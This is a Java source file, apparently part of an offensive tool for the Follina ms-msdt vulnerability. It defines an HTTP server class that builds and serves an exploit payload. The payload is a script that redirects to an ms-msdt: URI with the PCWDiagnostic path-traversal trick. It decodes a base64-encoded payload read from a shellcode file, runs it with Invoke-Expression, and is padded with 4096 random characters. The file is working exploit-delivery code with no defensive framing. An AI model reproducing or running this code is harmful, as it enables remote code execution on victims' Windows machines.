package follina.server.http;

import java.net.*;
import java.util.Base64;
import java.util.Random;import java.util.concurrent.ThreadLocalRandom;

import follina.server.Anunnaki;
import follina.server.App;
import follina.server.FolinaException;
import follina.server.Utils;

import java.io.*;

public class ServerHTTP implements Runnable {

	// Variable
	private static ServerHTTP instance;
	private static String payload;
	private ServerSocket serverSocket;

	private ServerHTTP() {
		try {
			serverSocket = new ServerSocket(Anunnaki.PORT);
			payload = generatePayload(Anunnaki.ShellcodePath);
		} catch (IOException e) {
			// TODO: handle exception
		}
	}

	private String generatePayload(String shellCodePath) {

		try {
			// Now we will put 4096 byte to run our code
			String templatePayload = "<script>location.href = \"ms-msdt:/id PCWDiagnostic /skip force /param \\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{{yourpayloadhere}}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\"\"; //";
			String code = Utils.readFileContent(shellCodePath);
			code = Base64.getEncoder().encodeToString(code.getBytes());
			templatePayload = templatePayload.replace("{{yourpayloadhere}}", code);
			
			//I ll generate random between a-zA-z
			String randomByte = "";
			Random random = new Random();
			for(int i=0;i<4096;i++) {
				int ascii = random.nextInt(25); // Random 65 -> 90 ===> 0 -> (90 - 65)=25
				randomByte += (char)(ascii + 65) + "";
			}
			templatePayload += randomByte;
			return templatePayload;
		} catch (IOException e) {
			e.printStackTrace();
		}
		return "";
	}

	public static ServerHTTP getInstance() {
		if (instance == null)
			instance = new ServerHTTP();
		return instance;
	}

	public String getPayload() {
		return payload;
	}

	@Override
	public void run() {
		while (App.isRunning) {
			Socket socket;
			try {
				socket = serverSocket.accept();
				Thread thread = new Thread(new ConnectionManager(socket));
				thread.start();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

	}

}
